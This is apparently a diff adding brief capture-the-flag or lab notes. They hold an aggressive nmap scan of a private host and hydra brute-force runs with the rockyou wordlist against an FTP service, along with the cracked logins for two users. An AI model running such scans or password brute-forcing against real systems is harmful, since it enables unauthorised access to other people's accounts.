@@ -1,0 +1,6 @@
+└─$ sudo nmap  -p- -T5  -A  10.10.231.91
+└─$ hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.10.231.91 -s 10021 ftp -V
+  [10021][ftp] host: 10.10.231.91   login: eddie   password: jordan
+
+└─$ hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.10.231.91 -s 10021 ftp -V
+[10021][ftp] host: 10.10.231.91   login: quinn   password: andrea
